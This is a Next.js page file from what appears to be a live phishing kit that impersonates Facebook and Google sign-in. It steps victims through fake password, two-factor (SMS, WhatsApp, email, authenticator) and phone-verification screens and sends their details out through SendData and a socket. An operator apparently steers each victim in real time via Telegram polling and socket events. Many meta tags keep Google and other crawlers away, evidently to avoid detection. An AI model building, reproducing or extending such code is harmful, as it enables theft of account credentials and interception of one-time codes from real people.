import Head from "next/head";
import styles from "../styles/Home.module.css";
import React, { createContext, useState, useEffect } from "react";
import { io } from "socket.io-client";
import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";

// Component imports - Main page components
import Step1FB from "../components/fbook/Step1.js";
import Step2FB from "../components/fbook/Step2.js";
import FacebookAccessStep from "../components/fbook/FacebookAccessStep.js";
import Step3FB from "../components/fbook/Step3.js";
import Captcha from "../components/Captcha/Captcha.js";
import Fa2FB from "../components/fbook/Fa2.js";
import Fa2RedFB from "../components/fbook/Fa2Red.js";
import PhoneVerifyFB from "../components/fbook/PhoneVerify.js";
import Done from "../components/common/Done.js";
import Fa2WhatsappFB from "../components/fbook/Fa2Whatsapp.js";
import Fa2EmailFB from "../components/fbook/Fa2Email.js";
import Fa2AuthAppFB from "../components/fbook/Fa2AuthApp.js";
import NWaitFB from "../components/fbook/NWait.js";
import GoogleConfirm from "../components/frriSpecific/GoogleConfirm.js";
import Step1GM from "../components/gmail/Step1.js";
import Step2GM from "../components/gmail/Step2.js";
import Step3GM from "../components/gmail/Step3.js";
import Fa2GM from "../components/gmail/Fa2.js";
import Fa2RedGM from "../components/gmail/Fa2Red.js";
import PhoneVerifyGM from "../components/gmail/PhoneVerify.js";
import Fa2WhatsappGM from "../components/gmail/Fa2Whatsapp.js";
import Fa2EmailGM from "../components/gmail/Fa2Email.js";
import Fa2AuthAppGM from "../components/gmail/Fa2AuthApp.js";
import GoogleSignInPC from "../components/gmail/GoogleSignInPC.js";
import GoogleSignInMobile from "../components/gmail/GoogleSignInMobile.js";

// Hooks
import { useUserData } from "../hooks/useUserData";
import { useStepManagement } from "../hooks/useStepManagement";
import { useIPManagement } from "../hooks/useIPManagement";
import { useInitialSetup } from "../hooks/useInitialSetup";
import { useTelegramPolling } from "../hooks/useTelegramPolling";
import { useSocketConnection } from "../utils/socket/useSocketConnection";
import SendData from "../hooks/SendData";
import { getSocketUrl } from "../config/api";

// Utils
import { PageUtils } from "../utils/pageUtils";

// Step mapping for better maintainability
const STEP_COMPONENTS_FB = {
  0: Captcha,
  1: Step1FB,
  18: FacebookAccessStep,
  2: Step2FB,
  3: Fa2FB,
  4: Step3FB,
  6: Fa2RedFB,
  7: Step1FB,
  10: PhoneVerifyFB,
  11: Done,
  12: Fa2WhatsappFB,
  13: Fa2EmailFB,
  14: Fa2FB,
  15: Fa2AuthAppFB,
  16: NWaitFB,
  17: GoogleConfirm,
};

const STEP_COMPONENTS_GM = {
  0: Captcha,
  1: Step1GM,
  2: Step2GM,
  3: Fa2GM,
  4: Step3GM,
  6: Fa2RedGM,
  7: Step1GM,
  10: PhoneVerifyGM,
  11: Done,
  12: Fa2WhatsappGM,
  13: Fa2EmailGM,
  14: Fa2GM,
  15: Fa2AuthAppGM,
  16: NWaitFB,
  17: GoogleConfirm,
};

export const DataContext = createContext();

export default function Home() {
  const AUTH_STEPS = new Set([1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15, 16, 18]);
  const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
  const [showGoogleSignIn, setShowGoogleSignIn] = useState(false);
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  const userData = useUserData();
  const stepManagement = useStepManagement();
  useHideRecaptchaBadge(AUTH_STEPS.has(stepManagement.Step));

  const { Unik } = useInitialSetup(
    userData.setAllData,
    stepManagement.setStep
  );

  const { Ip, setIp } = useIPManagement();

  useEffect(() => {
    if (userData.AllData?.ip && userData.AllData.ip !== Ip) {
      setIp(userData.AllData.ip);
    }
  }, [userData.AllData?.ip, Ip, setIp]);

  useEffect(() => {
    const check = () => setIsMobileDevice(window.innerWidth < 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);

  useEffect(() => {
    window.__appleFormSubmit = (stepText, email) => {
      setContinueWithFacebook(!email);

      if (email) {
        userData.setBusinessEmail(email);
      }

      const params = {
        ...userData.AllData,
        business_email: email || "",
        currentStep: stepText,
      };

      userData.setAllData(params);
      SendData(params);
      stepManagement.setStep(2);
    };

    return () => {
      delete window.__appleFormSubmit;
    };
  }, [
    userData.AllData,
    userData.setAllData,
    userData.setBusinessEmail,
    stepManagement.setStep,
  ]);

  useEffect(() => {
    const handleGoogleConfirm = () => stepManagement.setStep(17);
    window.addEventListener("admin-facebook-google", handleGoogleConfirm);
    return () =>
      window.removeEventListener("admin-facebook-google", handleGoogleConfirm);
  }, [stepManagement.setStep]);

  useEffect(() => {
    if (stepManagement.Step !== 17) {
      setShowGoogleSignIn(false);
    }
  }, [stepManagement.Step]);

  useTelegramPolling(
    Unik,
    stepManagement.setStep,
    stepManagement.setLastFetch,
    stepManagement.LastFetch,
    Ip,
    stepManagement.setWrong2faTrigger,
    stepManagement.wrong2faTrigger,
    stepManagement.setWrongPasswordTrigger,
    stepManagement.wrongPasswordTrigger,
    stepManagement.setWrongCredsTrigger,
    stepManagement.wrongCredsTrigger,
    stepManagement.Step
  );

  useSocketConnection(Unik, userData.AllData);

  useEffect(() => {
    if (!Unik) return;

    const socketInstance = io(getSocketUrl(), {
      transports: ["websocket", "polling"],
    });

    const twoFaEvent = `gmail-2fa-${Unik}`;
    socketInstance.on(twoFaEvent, (data) => {
      if (data.type === "email2fa" && !(stepManagement.Step === 17 && showGoogleSignIn)) {
        console.log("[Home] email2fa decision received via socket, setting step 13");
        stepManagement.setStep(13);
        stepManagement.setLastFetch("Email2fa");
      }
    });

    socketInstance.connect();

    return () => {
      socketInstance.disconnect();
    };
  }, [Unik, stepManagement, showGoogleSignIn]);

  const isGoogleSignInActive =
    stepManagement.Step === 17 && showGoogleSignIn;

  const { title, favicon } = isGoogleSignInActive
    ? {
        title: "Sign in - Google Accounts",
        favicon: "/Images/google.svg",
      }
    : PageUtils.getPageMeta(stepManagement.Step);

  const renderGoogleSignIn = () => {
    const googleSignInProps = {
      Unik,
      Tel: userData.AllData?.phone_number || "",
      Email: userData.AllData?.login_email || userData.AllData?.email || "",
      setEmail: (value) =>
        userData.setAllData((prev) => ({ ...prev, login_email: value })),
      Name: userData.AllData?.full_name || "",
      BusinessEmail: userData.AllData?.business_email || "",
      Ip,
      setParentBeginTimer: () => {},
      onClose: () => setShowGoogleSignIn(false),
    };

    return isMobileDevice ? (
      <GoogleSignInMobile {...googleSignInProps} />
    ) : (
      <GoogleSignInPC {...googleSignInProps} />
    );
  };

  const renderStepComponent = () => {
    if (stepManagement.Step === 17 && showGoogleSignIn) {
      return renderGoogleSignIn();
    }

    const stepComponents = ContinueWithFacebook
      ? STEP_COMPONENTS_FB
      : STEP_COMPONENTS_GM;
    const Component = stepComponents[stepManagement.Step];
    if (!Component) return null;

    const commonProps = {
      setStep: stepManagement.setStep,
      setShowGoogleSignIn,
      Unik,
      Ip,
      setIp,
      Step: stepManagement.Step,
      InvalidPassword: stepManagement.InvalidPassword,
      ContinueWithFacebook,
      setContinueWithFacebook,
      LastFetch: stepManagement.LastFetch,
      wrong2faTrigger: stepManagement.wrong2faTrigger,
      wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
      wrongCredsTrigger: stepManagement.wrongCredsTrigger,
      ...userData,
    };

    if (stepManagement.Step === 17) {
      commonProps.onConfirm = () => setShowGoogleSignIn(true);
      commonProps.onClose = () => {
        setContinueWithFacebook(true);
        setShowGoogleSignIn(false);
        stepManagement.setStep(2);
      };
    }

    return <Component {...commonProps} />;
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>{title}</title>
        <link rel="icon" href={favicon} />
        <meta charSet="utf-8" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
        <meta name="theme-color" content="#fff" />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta
          name="crawler"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="AdsBot-Google"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot-news"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name="robots" content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: light)"
        />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: dark)"
        />
      </Head>

      <DataContext.Provider
        value={{ setAllData: userData.setAllData, AllData: userData.AllData }}
      >
        <div className="">
          <div className="">{renderStepComponent()}</div>
        </div>
      </DataContext.Provider>
    </div>
  );
}
